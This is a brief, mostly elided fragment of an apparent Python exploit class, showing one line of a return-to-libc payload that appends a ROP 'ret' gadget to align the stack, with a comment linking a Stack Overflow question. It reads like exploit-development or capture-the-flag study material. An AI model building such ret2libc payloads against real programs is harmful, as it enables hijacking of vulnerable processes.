...
class Exploit:
    ...
    def return_to_libc(self, proc, canary, libc_address):
        ...
        payload += pack("<Q", libc_address+libc_rop.find_gadget(["ret"])[0]) # go to ret to align stack to 16 byte. See reference here: https://stackoverflow.com/questions/60729616/segfault-in-ret2libc-attack-but-not-hardcoded-system-call
